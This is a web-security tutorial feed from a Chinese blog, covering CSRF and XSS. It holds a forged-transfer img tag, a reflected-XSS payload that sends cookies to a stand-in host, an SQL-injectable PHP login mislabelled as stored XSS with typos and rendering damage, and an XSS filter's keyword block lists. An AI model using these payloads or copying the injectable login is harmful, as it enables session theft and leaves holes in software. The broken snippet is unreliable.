<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: 安全 | Blog like hacke]]></title>
  <link href="http://ztlblog.github.io/blog/categories/an-quan/atom.xml" rel="self"/>
  <link href="http://ztlblog.github.io/"/>
  <updated>2015-07-22T17:30:50+08:00</updated>
  <id>http://ztlblog.github.io/</id>
  <author>
    <name><![CDATA[ztl]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[csrf攻击]]></title>
    <link href="http://ztlblog.github.io/blog/2015/06/25/php004/"/>
    <updated>2015-06-25T13:25:55+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/06/25/php004</id>
    <content type="html"><![CDATA[<h2>什么是csrf攻击</h2>

<p>csrf（cross-site request forgery）跨站请求伪造</p>

<h2>csrf的原理</h2>

<p><img src="http://pic002.cnblogs.com/img/hyddd/200904/2009040916453171.jpg" alt="tool-manager" /></p>

<h2>例如：</h2>

<p>银行网站A，它以get请求来完成银行转账的操作，<a href="http://www.mybank.com/Transfer.php?toBankId=11&amp;money=100">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=100</a>
危险网站B，它里面有一段html的代码如下：
<code>&lt;img src='http://www.mybank.com/Transfer.php?toBankId=11&amp;money=100'/&gt;</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[xss攻击]]></title>
    <link href="http://ztlblog.github.io/blog/2015/06/25/php003/"/>
    <updated>2015-06-25T13:25:55+08:00</updated>
    <id>http://ztlblog.github.io/blog/2015/06/25/php003</id>
    <content type="html"><![CDATA[<h2>什么是xss</h2>

<p>xss 表示cross site scripting（跨站脚本攻击）
一般分为两中类型
1：非持久型攻击
2：持久型攻击</p>

<h3>例如:</h3>

<p><figure class='code'><figcaption><span>非持久型 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>非持久型攻击是一次性的，仅对当前的页面访问产生影响
</span><span class='line'>$name = $_GET[&lsquo;name&rsquo;];
</span><span class='line'>echo &ldquo;welcome $name&rdquo;;
</span><span class='line'>echo &ldquo;&lt;a href='http://www.baidu.com'>click to down&lt;/a>&rdquo;;
</span><span class='line'>攻击者可以通过下面url链接
</span><span class='line'>index.php?name=guest&lt;script>alert(&lsquo;test&rsquo;)&lt;/script>
</span><span class='line'>index.php?name=guest&lt;script>new Image().src=&ldquo;&lt;a href="http://mytest.com/?">http://mytest.com/?&lt;/a>&rdquo;+document.cookie&lt;/script></span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><figcaption><span>持久型 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>持久型xss攻击会把攻击者的数据存储在服务器端，攻击行为将伴随者攻击数据一直存在
</span><span class='line'>$host = &lsquo;192.168.1.8&rsquo;;
</span><span class='line'>$dbname = &lsquo;app&rsquo;;
</span><span class='line'>$user = &lsquo;yyy&rsquo;;
</span><span class='line'>$password = &lsquo;xxx&rsquo;;
</span><span class='line'>$schema = &lsquo;test&rsquo;;
</span><span class='line'>$conection_string = &ldquo;host=$host dbname=$dbname user=$user password=$password&rdquo;;
</span><span class='line'>$connect = pg_connect($conection_string,$PGSQL_CONNECT_NEW);
</span><span class='line'>if(!Connect){
</span><span class='line'>    echo &lsquo;database connection failure&rsquo;;
</span><span class='line'>    exit;
</span><span class='line'>}
</span><span class='line'>$query = &ldquo;select user_name,password from $schema.members where user_name'&rdquo;.$&lt;em>POST[&lsquo;user_name&rsquo;].&ldquo;&lsquo;&rdquo;;
</span><span class='line'>$result = pg_query($connect,$query);
</span><span class='line'>$row = pg_fetch_array($result,NULL,PGSOL_ASSOC);
</span><span class='line'>$user_pass = md5($&lt;/em>POST['pass_word&rsquo;]);
</span><span class='line'>$user_name = $row[&lsquo;user_name&rsquo;];
</span><span class='line'>if(strcmp($user_pass,$row[&lsquo;password&rsquo;]!=0)){
</span><span class='line'>    echo &ldquo;Login failed&rdquo;;
</span><span class='line'>}else{
</span><span class='line'>    session_start();
</span><span class='line'>    $_SESSION[&lsquo;USER_NAME&rsquo;] = $user_name;
</span><span class='line'>    echo &ldquo;&lt;head>&lt;meta http-equiv=\"Refresh\" content=\"0;url=home.php\">&lt;/head>&rdquo;;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure></p>

<h2>预防措施</h2>

<p><figure class='code'><figcaption><span>cookie </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>如保存用户登录状态的cookie，设置httponly，php的setcookie函数最后一个参数即可设置
</span><span class='line'>setcookie(name,value,expire,path,domain,secure)
</span><span class='line'>name:cookie的名称
</span><span class='line'>value：cookie的值
</span><span class='line'>expire：cookie的有效期
</span><span class='line'>path：cookie的服务器路径
</span><span class='line'>domain：cookie的域名
</span><span class='line'>secure：规定是否通过安全的https链接来传输cookie</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><figcaption><span>输入检查 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>不要让用户写入任何script和发起恶意http请求的东西
</span><span class='line'>htmlspecialchars处理</span></code></pre></td></tr></table></div></figure></p>

<h2>防止xss攻击（不是我写的）</h2>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function xss_clean($str, $is_image = FALSE)
</span><span class='line'>{
</span><span class='line'>    if (is_array($str))
</span><span class='line'>    {
</span><span class='line'>        while (list($key) = each($str))
</span><span class='line'>        {
</span><span class='line'>            $str[$key] = $this->xss_clean($str[$key]);
</span><span class='line'>        }&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code>    return $str;
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>$str = remove_invisible_characters($str);
</span><span class='line'>
</span><span class='line'>$str = $this-&gt;_validate_entities($str);
</span><span class='line'>
</span><span class='line'>$str = rawurldecode($str);
</span><span class='line'>
</span><span class='line'>$str = preg_replace_callback("/[a-z]+=([\'\"]).*?\\1/si", array($this, '_convert_attribute'), $str);
</span><span class='line'>
</span><span class='line'>$str = preg_replace_callback("/&lt;\w+.*?(?=&gt;|&lt;|$)/si", array($this, '_decode_entity'), $str);
</span><span class='line'>
</span><span class='line'>$str = remove_invisible_characters($str);
</span><span class='line'>if (strpos($str, "\t") !== FALSE)
</span><span class='line'>{
</span><span class='line'>    $str = str_replace("\t", ' ', $str);
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>$converted_string = $str;
</span><span class='line'>
</span><span class='line'>$str = $this-&gt;_do_never_allowed($str);
</span><span class='line'>
</span><span class='line'>if ($is_image === TRUE)
</span><span class='line'>{
</span><span class='line'>    $str = preg_replace('/&lt;\?(php)/i', "&amp;lt;?\\1", $str);
</span><span class='line'>}
</span><span class='line'>else
</span><span class='line'>{
</span><span class='line'>    $str = str_replace(array('&lt;?', '?'.'&gt;'),  array('&amp;lt;?', '?&amp;gt;'), $str);
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>$words = array(
</span><span class='line'>    'javascript', 'expression', 'vbscript', 'script', 'base64',
</span><span class='line'>    'applet', 'alert', 'document', 'write', 'cookie', 'window'
</span><span class='line'>);
</span><span class='line'>
</span><span class='line'>foreach ($words as $word)
</span><span class='line'>{
</span><span class='line'>    $temp = '';
</span><span class='line'>
</span><span class='line'>    for ($i = 0, $wordlen = strlen($word); $i &lt; $wordlen; $i++)
</span><span class='line'>    {
</span><span class='line'>        $temp .= substr($word, $i, 1)."\s*";
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    $str = preg_replace_callback('#('.substr($temp, 0, -3).')(\W)#is', array($this, '_compact_exploded_words'), $str);
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>do
</span><span class='line'>{
</span><span class='line'>    $original = $str;
</span><span class='line'>
</span><span class='line'>    if (preg_match("/&lt;a/i", $str))
</span><span class='line'>    {
</span><span class='line'>        $str = preg_replace_callback("#&lt;a\s+([^&gt;]*?)(&gt;|$)#si", array($this, '_js_link_removal'), $str);
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    if (preg_match("/&lt;img/i", $str))
</span><span class='line'>    {
</span><span class='line'>        $str = preg_replace_callback("#&lt;img\s+([^&gt;]*?)(\s?/?&gt;|$)#si", array($this, '_js_img_removal'), $str);
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    if (preg_match("/script/i", $str) OR preg_match("/xss/i", $str))
</span><span class='line'>    {
</span><span class='line'>        $str = preg_replace("#&lt;(/*)(script|xss)(.*?)\&gt;#si", '[removed]', $str);
</span><span class='line'>    }
</span><span class='line'>}
</span><span class='line'>while($original != $str);
</span><span class='line'>
</span><span class='line'>unset($original);
</span><span class='line'>$str = $this-&gt;_remove_evil_attributes($str, $is_image);
</span><span class='line'>$naughty = 'alert|applet|audio|basefont|base|behavior|bgsound|blink|body|embed|expression|form|frameset|frame|head|html|ilayer|iframe|input|isindex|layer|link|meta|object|plaintext|style|script|textarea|title|video|xml|xss';
</span><span class='line'>$str = preg_replace_callback('#&lt;(/*\s*)('.$naughty.')([^&gt;&lt;]*)([&gt;&lt;]*)#is', array($this, '_sanitize_naughty_html'), $str);
</span><span class='line'>$str = preg_replace('#(alert|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)\((.*?)\)#si', "\\1\\2&amp;#40;\\3&amp;#41;", $str);
</span><span class='line'>
</span><span class='line'>$str = $this-&gt;_do_never_allowed($str);
</span><span class='line'>
</span><span class='line'>if ($is_image === TRUE)
</span><span class='line'>{
</span><span class='line'>    return ($str == $converted_string) ? TRUE: FALSE;
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>log_message('debug', "XSS Filtering completed");
</span><span class='line'>return $str;
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p>}</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
</feed>
